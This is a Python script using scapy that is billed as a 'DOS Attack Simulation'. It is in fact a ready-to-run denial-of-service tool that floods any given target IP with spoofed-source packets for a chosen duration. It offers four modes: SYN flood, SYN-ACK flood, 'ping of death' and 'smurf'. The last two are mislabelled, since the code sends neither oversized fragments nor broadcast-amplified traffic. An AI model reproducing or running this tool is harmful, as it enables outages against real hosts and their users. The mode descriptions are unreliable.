from scapy.all import *
import random
import argparse
import time

def generate_random_ip():
    """Generate a random IPv4 address."""
    return ".".join(map(str, (random.randint(1, 255) for _ in range(4))))

def ddos(target_ip, attack_type, duration):
    target_port = 12345
    end_time = time.time() + duration

    if attack_type == "syn_flood":
        while time.time() < end_time:
            src_ip = generate_random_ip()  # Generate a new random IP for each packet
            src_port = random.randint(1024, 65535)
            pkt = IP(src=src_ip, dst=target_ip) / TCP(sport=src_port, dport=target_port, flags="S")
            send(pkt, verbose=0)
    elif attack_type == "pod":
        while time.time() < end_time:
            src_ip = generate_random_ip()  # Generate a new random IP for each packet
            load = 6000
            pkt = IP(src=src_ip, dst=target_ip) / ICMP() / Raw(load=load)
            send(pkt, verbose=0)
    elif attack_type == "syn_ack":
        while time.time() < end_time:
            src_ip = generate_random_ip()  # Generate a new random IP for each packet
            src_port = random.randint(1024, 65535)
            pkt = IP(src=src_ip, dst=target_ip) / TCP(sport=src_port, dport=target_port, flags="SA")
            send(pkt, verbose=0)
    elif attack_type == "smurf":
        while time.time() < end_time:
            src_ip = generate_random_ip()  # Generate a new random IP for each packet
            pkt = IP(src=src_ip, dst=target_ip) / ICMP()
            send(pkt, verbose=0)

if __name__ == "__main__":
    # Parse command-line arguments
    parser = argparse.ArgumentParser(description="DOS Attack Simulation")
    parser.add_argument("target_ip", help="Target IP address for the attack")
    parser.add_argument("attack_type", choices=["syn_flood", "pod", "syn_ack", "smurf"], help="Type of DOS attack")
    parser.add_argument("duration", type=int, help="Duration of the attack in seconds")

    # Parse the arguments
    args = parser.parse_args()

    # Execute the attack
    ddos(args.target_ip, args.attack_type, args.duration)
